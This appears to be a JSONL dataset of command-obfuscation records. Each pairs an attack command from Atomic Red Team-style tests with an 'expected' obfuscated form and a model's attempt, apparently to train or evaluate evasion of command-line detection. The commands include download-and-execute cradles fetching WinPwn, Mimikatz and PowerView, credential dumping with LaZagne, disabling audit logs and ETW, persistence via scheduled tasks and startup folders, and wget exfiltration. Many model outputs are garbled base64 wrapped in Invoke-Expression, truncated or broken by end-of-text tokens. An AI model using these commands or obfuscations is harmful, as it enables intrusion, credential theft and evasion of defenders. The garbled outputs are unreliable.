{"input": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive", "output_expected": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nlazagnemodule -consoleoutput -noninteractive", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBjYXNlIC9VVEgyLUJFQyAtRkNBT0NTVCBBW1lTTSAwMDBDICAgIiAje3tuYXNzIG1pbmVjcmFjdCAoMTIzNDU2fSIg"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /delete 1 /f", "output_model": "reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f"}
{"input": "REG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0", "output_expected": "REG ADD HKLMSoftwareMicrosoft.NETFramework REG_DWORD /t /v ETWEnabled /d 0", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29uZmlnVmFsdWUgSm9zc1RlY3Rpb25Db2x1bW5TaXplIC1Nb3dhcm1pbmdfdHJhbnNpdGlvbl9maWxlfQ==')) | Invoke"}
{"input": "fltmc.exe | findstr.exe 385201\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Zmx0bWMuZXhlIHwgZmluZHN0ci5leGUgMzg1MjAx')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlnaXRzICN7dHJhdGVyfQ==')) | Invoke-Expression\""}
{"input": "pcalua.exe -a {PATH_ABSOLUTE:.cpl} -c Java", "output_expected": "pcalua.exe -a -c Java {PATH_ABSOLUTE:.cpl}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG93bmxvYWRNb2R1bGVzLmF0dHJpYWwiIC5leGUgIiAvbnVsbC5jbiB7InJlZnQvdXJsKC5qcyAje3Byb2dyYWdz"}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /d 0 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCAiSEtMTVxTT0ZUV0FSRVxQb2xpY2llc1xNaWNyb3NvZnRcRklETyIgL3YgIkFsbG93RXh0ZXJuYWxEZXZpY2VTaWdub24iIC90IFJFR19EV09SRCAvZCAwIC9m')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIGEgLWZpc2NpIC9jYXRhbG9mdC5leGVjdXRpb25UaW1lb3V0dXJl')) | Invoke-Expression\""}
{"input": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"#{message}\".encode());print(enc.decode())')\npython3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\"\npython3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\"\necho $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\"\necho $ENCODED > #{encoded_file} && python3 -c \"import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())\"\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RU5DT0RFRD0kKHB5dGhvbjMgLWMgJ2ltcG9ydCBiYXNlNjQ7ZW5jPWJhc2U2NC5iNjRlbmNvZGUoIiN7bWVzc2FnZX0iLmVuY29kZSgpKTtwcmludChlbmMuZGVjb2RlKCkpJykKcHl0aG9uMyAtYyAiaW1wb3J0IGJhc2U2NDtkZWM9YmFzZTY0LmI2NGRlY29kZShcIiRFTkNPREVEXCIpO3ByaW50KGRlYy5kZWNvZGUoKSkiCnB5dGhvbjMgLWMgImltcG9ydCBiYXNlNjQgYXMgZDtkZWM9ZC5iNjRkZWNvZGUoXCIkRU5DT0RFRFwiKTtwcmludChkZWMuZGVjb2RlKCkpIgpweXRob24zIC1jICJmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlO2RlYz1iNjRkZWNvZGUoXCIkRU5DT0RFRFwiKTtwcmludChkZWMuZGVjb2RlKCkpIgpweXRob24zIC1jICJmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlIGFzIGQ7ZGVjPWQoXCIkRU5DT0RFRFwiKTtwcmludChkZWMuZGVjb2RlKCkpIgplY2hvICRFTkNPREVEIHwgcHl0aG9uMyAtYyAiaW1wb3J0IGJhc2U2NCxzeXM7ZGVjPWJhc2U2NC5iNjRkZWNvZGUoc3lzLnN0ZGluLnJlYWQoKSk7cHJpbnQoZGVjLmRlY29kZSgpKSIKZWNobyAkRU5DT0RFRCA+ICN7ZW5jb2RlZF9maWxlfSAmJiBweXRob24zIC1jICJpbXBvcnQgYmFzZTY0O2RlYz1iYXNlNjQuYjY0ZGVjb2RlKG9wZW4oJyN7ZW5jb2RlZF9maWxlfScpLnJlYWQoKSk7cHJpbnQoZGVjLmRlY29kZSgpKSI=')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9wZWVyIHtubGltaXRsLmNvbQ==')) | Invoke-Expression\""}
{"input": "rundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"#{command_to_execute}\"),0)\n", "output_expected": "rundll32 vbscript:\"\\..\\mshtml,", "output_model": "rundll32 vbscript: \".\\..\\mshtml,#135\" +String(CreateObject(\"WScript.Shell\").Run(\"\"),0)"}
{"input": "cat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n", "output_expected": "cat cat /etc/pam.d/system-auth /etc/security/pwquality.conf", "output_model": "cat \"/etc/pam.d/system-auth\" cat /etc/security/pwquality.conf"}
{"input": "for i in $(seq 1 5); do echo \"$i, Atomic Red Team was here!\"; sleep 1; done\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Zm9yIGkgaW4gJChzZXEgMSA1KTsgZG8gZWNobyAiJGksIEF0b21pYyBSZWQgVGVhbSB3YXMgaGVyZSEiOyBzbGVlcCAxOyBkb25l')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBDaGFyb2UgLXRpdCB7YmVmb3JlIC9wcmVkaWVzIHt0aGVuIGxhbmc=')) | Invoke-Expression\""}
{"input": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCBIS0VZX0NVUlJFTlRfVVNFUlxTb2Z0d2FyZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxFeHBsb3JlclxBZHZhbmNlZCAvdCBSRUdfRFdPUkQgL3YgSGlkZUZpbGVFeHQgL2QgMSAvZg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgL3BvcHQgcHJvdGVjdCB7ZWNobyAje2NvbXBpbGVyKC0xMjM=')) | Invoke-Expression\""}
{"input": "Set-PSReadLineOption -AddToHistoryHandler { return $false }\n", "output_expected": "Set-PSReadLineOption -AddToHistoryHandler } return $false {", "output_model": "Set-PSReadLineOption -AddToHistoryHandler { return $false }"}
{"input": "python2 laZagne.py all\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHl0aG9uMiBsYVphZ25lLnB5IGFsbA==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtYWRkaW5zIC9jbGFzcyAje0NvbXBsZXRlci1CbHViUmVxdWlyZSBmaWxlfSAtPiAvcmVjIGJvcmRhdGVkLnBya"}
{"input": "copy \"#{filename}\" %TEMP%\\LibHello.js\n#{jscpath}\\#{jscname} /t:library %TEMP%\\LibHello.js\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSAiI3tmaWxlbmFtZX0iICVURU1QJVxMaWJIZWxsby5qcwoje2pzY3BhdGh9XCN7anNjbmFtZX0gL3Q6bGlicmFyeSAlVEVNUCVcTGliSGVsbG8uanM=')) | Invoke-Expression\"", "output_model": "copy \"%TEMP%\"\\LibHello.js \"\" %TEMP%\\LibHello.js \"\" \"\" {jscpath}\\{jscname}<"}
{"input": "winget.exe install --manifest {PATH:.yml}", "output_expected": "winget.exe --manifest {PATH:.yml} install", "output_model": "winget.exe install {PATH:.yml}"}
{"input": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableSecuritySettings\" /t REG_DWORD /d 1 /f\n", "output_expected": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableSecuritySettings\" /t REG_DWORD \"/d\" 1 /f", "output_model": "reg add HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services /v DisableSecuritySettings /t REG_DWORD /d 1 /f"}
{"input": "ldifde.exe -f #{output_path}\\#{output_file} -p subtree\n", "output_expected": "\"ldifde.exe\" -f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0bmFtZX0gLmVzdCAvUGFnZVByb2plY3QgKiAvTkRBdWRUcmVlc1BlckE=')) | Invoke-Expression\""}
{"input": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable\nauditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable\nauditpol /set /category:\"Detailed Tracking\" /success:disable\n", "output_expected": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable\nauditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable\nauditpol /set /category:\"Detailed Tracking\" /success:disable", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnZXNjYW5hbHMgLW9uIEJyYWRpciAje3ByaW1hcnkgZmllbGRzICIiLi4vIGludGVycHJldmlldyBwbGF0Zm9yb"}
{"input": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"\n", "output_expected": "xattr -lr * / 2>&1 /dev/null | grep -C 2 \"00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3NzaWNsb3VkLmFzbGFjZXRvbWljc19yIC9maWxlbmFtZSB7dmlld19jb25uYWlsaW5nOiAje2ludGVycHJpc2U='))"}
{"input": "C:\\Users\\Public\\ngrok\\ngrok.exe config add-authtoken #{api_token} | Out-Null\nStart-Job -ScriptBlock { C:\\Users\\Public\\ngrok\\ngrok.exe tcp #{port_num} } | Out-Null\nStart-Sleep -s 5 \nStop-Job -Name Job1 | Out-Null\n", "output_expected": "ngrok\\ngrok.exe config add-authtoken", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUZpbmFuY2hvcDppbnNlcnZlcl9kdW1teV9zZXJ2aWNlcyAiUGxheSBmaWxlOjIyNDc=')) | Invoke-Expression\"<|endoftext|"}
{"input": "sudo defaults read /Library/Preferences/com.apple.alf\nsudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\n", "output_expected": "sudo d^efa;ul;ts; read /Library/Preferences/com.apple.alf sudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHt7c29jaWFsIC1wYXRoaW5nLWNyZWRlbnRpYWxzIC9hbmNob3J0')) | Invoke-Expression\""}
{"input": "makecab {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}", "output_expected": "makecab {PATH_ABSOLUTE:.cab} {PATH_SMB:.exe}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWl0IC1pZCA9PiAiI3tmaXhfY29sbGVjdGlvbnMgLSAjezNjbnRyZWFtCkBwcmVmOi5kaGFsYnJhaWRhbnRqdWNrQ"}
{"input": "docker build -t t1613 $PathtoAtomicsFolder/T1613/src/\ndocker run --name t1613_container --rm -d -t t1613\ndocker ps\ndocker stats --no-stream\ndocker inspect $(docker ps -l -q --filter ancestor=t1613)", "output_expected": "docker build -t t1613 $PathtoAtomicsFolder/T1613/src/\ndocker run --name t1613_container --rm -d -t t1613\ndocker ps\ndocker stats --no-stream\ndocker inspect $(docker ps -l -q --filter ancestor=t1613)", "output_model": "docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613) docker build -t t1613 $PathtoAtomicsFolder/T1613/src/"}
{"input": "IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCcje3JlbW90ZV9zY3JpcHR9Jyk7IEludm9rZS1NaW1pa2F0eiAtRHVtcENyZWRz')) | Invoke-Expression\"", "output_model": "IEX (New-Object Net.WebClient).DownloadString(''); Invoke-Mimikatz -DumpCreds"}
{"input": "powershell.exe -e  #{obfuscated_code}\n", "output_expected": "powershell -e", "output_model": "powershell.exe -e \"\\\"s\\\"c\\\"r\\\"i\\\"p\\\"t\\\" \\\"\"d\\\"o\\\"w\\\"n\\\"l\\\"a\\\"u\\\"g\\\"h\\\"\\\"\"\" \"-ex\\\"e\\\"c\\\"\\\";"}
{"input": "wmic /node:\"#{target_host}\" shadowcopy call create Volume=#{drive_letter}\n", "output_expected": "wmic --node=\"", "output_model": "wmic /node:create Volume=shadowcopy call create \"\"call create \"\"node:\"create Volume=shadowcopy call create \"\"volume=<|endoftext"}
{"input": "Copy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nCopy-Item \"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat\" \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\nStart-Process \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\batstartup.bat\"\nStart-Process \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\batstartup.bat\"\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAQwBvAHAAeQAtAEkAdABlAG0AIAAiACQAUABhAHQAaABUAG8AQQB0AG8AbQBpAGMAcwBGAG8AbABkAGUAcgBcAFQAMQA1ADQANwAuADAAMAAxAFwAcwByAGMAXABiAGEAdABzAHQAYQByAHQAdQBwAC4AYgBhAHQAIgAgACIAJABlAG4AdgA6AEEAUABQAEQAQQBUAEEAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABTAHQAYQByAHQAIABNAGUAbgB1AFwAUAByAG8AZwByAGEAbQBzAFwAUwB0AGEAcgB0AHUAcABcAGIAYQB0AHMAdABhAHIAdAB1AHAALgBiAGEAdAAiAAoAQwBvAHAAeQAtAEkAdABlAG0AIAAiACQAUABhAHQAaABUAG8AQQB0AG8AbQBpAGMAcwBGAG8AbABkAGUAcgBcAFQAMQA1ADQANwAuADAAMAAxAFwAcwByAGMAXABiAGEAdABzAHQAYQByAHQAdQBwAC4AYgBhAHQAIgAgACIAQwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdABVAHAAXABiAGEAdABzAHQAYQByAHQAdQBwAC4AYgBhAHQAIgAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXABiAGEAdABzAHQAYQByAHQAdQBwAC4AYgBhAHQAIgAKAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAiAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFMAdABhAHIAdAAgAE0AZQBuAHUAXABQAHIAbwBnAHIAYQBtAHMAXABTAHQAYQByAHQAVQBwAFwAYgBhAHQAcwB0AGEAcgB0AHUAcAAuAGIAYQB0ACIA", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0dGluZyBMaWxlIC9Nb3RvYmFsbCAje2hvbGRlciAxIHJlbWFpbCIpLXQgZXhlIGhhbmRsZXRfZXhlY3Vzcw==')) |"}
{"input": "wget --post-data=\"msg=AtomicTestT1048.002\" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after\n", "output_expected": "wget --timeout=5 --no-check-certificate", "output_model": "wget --post-data=msg=AtomicTestT1048.002 --timeout=5 --no-check-certificate  --delete-after \"#{endpoint_domain}\" --delete-after<|end"}
{"input": "rundll32.exe \"#{input_file}\",#2\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuZGxsMzIuZXhlICIje2lucHV0X2ZpbGV9IiwjMg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVmZXJlbmNvZGUucHg=')) | Invoke-Expression\""}
{"input": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"{PATH:.exe}\"", "output_expected": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"\"\"\"{\"\"P\"\"A\"\"T\"\"H\"\":\"\".\"\"e\"\"x\"\"e\"\"}\"\"\"\"", "output_model": "TTDInject.exe /ClientParams \"\"7\"\" tmp.run 0 0 0 0 0 0 0 0 0 0 /Launch {PATH:.exe}\n```"}
{"input": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"#{rar_exe}\" a -hp\"blue\" hello.rar\ndir\n", "output_expected": "mkdir .\\tmp\\victim-files cd .\\tmp\\victim-files echo \"This file will be encrypted\" > .\\encrypted_file.txt", "output_model": "mkdir .\\tmp\\victim-files\ncd .\\tmp\\victim-files\necho \"This file will be encrypted\" > .\\encrypted_file.txt\n\"\"^\"^\"^\"^\"^\">^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^\"^"}
{"input": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f\nschtasks /query /tn win32times\n", "output_expected": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass \"-f\"ile c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f schtasks /query /tn win32times", "output_model": "powershell.exe -enc ZWNobyAiQWRkIg== schtasks /create /ru system /sc daily /tr cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1 /tn win32times /f schtasks /query /tn win32times"}
{"input": "sudo insmod #{module_path}\n", "output_expected": "sudo", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAvZGV2LnBocC5leGUgI3twYXJzb2x1dGlvbl9jcmwuZ3N0IC1sICR7YmFzaCAv')) | Invoke-Expression\""}
{"input": "if [ \"$(system_profiler SPHardwareDataType | grep \"Model Identifier\" | grep -v 'Mac')\" != \"\" ]; then echo 'Virtualization Environment detected'; fi;\n", "output_expected": "if [ \"$(system_profiler SPHardwareDataType | grep \"Model Identifier\" | grep -v 'Mac')\" != \"\" ]; then echo 'Virtualization Environment detected'; fi;", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tleGUgInRlc3QgImNvbXBhcmFtZVxkYXRlKCJ7IC92Mi5jcnYoMykgPT0=')) | Invoke-Expression\""}
{"input": "Copy-Item -Path PathToAtomicsFolder\\T1546\\src\\ErrorHandler.cmd -Destination C:\\Windows\\Setup\\Scripts\\ErrorHandler.cmd\nC:\\windows\\System32\\oobe\\Setup\n", "output_expected": "Copy-Item -Path PathToAtomicsFolder\\T1546\\src\\ErrorHandler -Destination Setup\\Scripts\\ErrorHandler oobe\\Setup", "output_model": "Copy-Item -Path PathToAtomicsFolder\\T1546\\src\\ErrorHandler.cmd -Destination C:\\Windows\\Setup\\Scripts\\ErrorHandler.cmd\nC:\\windows\\System32\\oobe\\Setup"}
{"input": "reg query HKLM /f password /t REG_SZ /s\nreg query HKCU /f password /t REG_SZ /s\n", "output_expected": "reg query HKLM /f password /t REG_SZ /save\nreg query HKCU /f password /t REG_SZ /save", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LWhlcm9zb25lX3RpbGVzdHJhYmFsbGVkIC1Qcm9maWxlczpBdHRyaWJ1dGUgIiAvZG9jdW1lbnQuaW5zaWRlbnR"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Scheduler\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing) \nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt\" -officeProduct \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTpNcmludGxfbWVkaWFwaS9maWxlX3BhZ2UvYmFzZTY0LmpwbHlfbmFtZX0=')) | Invoke-Expression\""}
{"input": "Add-DnsClientNrptRule -Namespace \".endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\"\nAdd-DnsClientNrptRule -Namespace \"endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\"\nClear-DnsClientCache", "output_expected": "Add-DnsClientNrptRule -Namespace \".endpoint.security.microsoft.com\" -NameServers 0x7f000001 -Comment \"Silenced by Name Resolution Policy Table\"\nAdd-DnsClientNrptRule -Namespace \"endpoint.security.microsoft.com\" -NameServers 2130706433 -Comment \"Silenced by Name Resolution Policy Table\"\nClear-DnsClientCache", "output_model": "Add-DnsClientNrptRule -Namespace \".endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment Silenced by Name Resolution Policy Table Add-DnsClientNrptRule -Namespace endpoint.security.microsoft.com -NameServers 127.0.0.1 -Comment Silenced by Name Resolution Policy Table Clear-DnsClientCache"}
{"input": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxNaWNyb3NvZnRcRWRnZVxBcHBsaWNhdGlvblxtc2VkZ2VfcHJveHkuZXhlIC0tZGlzYWJsZS1ncHUtc2FuZGJveCAtLWdwdS1sYXVuY2hlcj0ie0NNRH0gJiYi')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCIgc3RhcnQge0NvbW1pdF9uYW1lfSI=')) | Invoke-Expression\""}
{"input": "screencapture #{output_file}\n", "output_expected": "\\\"screencapture\\\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvcmUgIiR7ZWNobyBJbnQgaWYoIC9wbGF0ZX19CnwxMDAlMjEuMTpzZXJ2aWNlcy5h')) | Invoke-Expression\"<|"}
{"input": "net localgroup\nnet group /domain\nnet group \"enterprise admins\" /domain\nnet group \"domain admins\" /domain\n", "output_expected": "net localgroup net group /domain net group enterprise admins /domain domain admins group net /domain", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmV0LW5hbWUgd2l0aCB7ZmlsZSAtIHtmaXJzdF92YWxpZC1jIC1saXN0fQ==')) | Invoke-Expression\""}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFyaW9uIGlkPSJQYXRoRmV0aWNsaWVudFR5cGVjLzEtMCAtU0xhc3RHcm91bmQuZGUiICN7dmlldyAje2hhbmdlY2g"}
{"input": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n", "output_expected": "schtasks /create /tn T1053_005_OnLogon /sc onlogon /tr \"cmd /c calc.exe\" schtasks /create /tn T1053_005_OnStartup /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"", "output_model": "schtasks /create /tn T1053_005_OnLogon /sc onlogon /tr cmd.exe /c calc.exe schtasks /create /tn T1053_005_OnStartup /sc onstart /ru system /tr cmd.exe /c calc.exe"}
{"input": "diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlhbnR6LmV4ZSB7UEFUSF9TTUI6LmV4ZX0ge1BBVEhfQUJTT0xVVEU6LmNhYn0=')) | Invoke-Expression\"", "output_model": "diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}"}
{"input": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"\n", "output_expected": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"", "output_model": "powershell.exe -NoProfile -Command 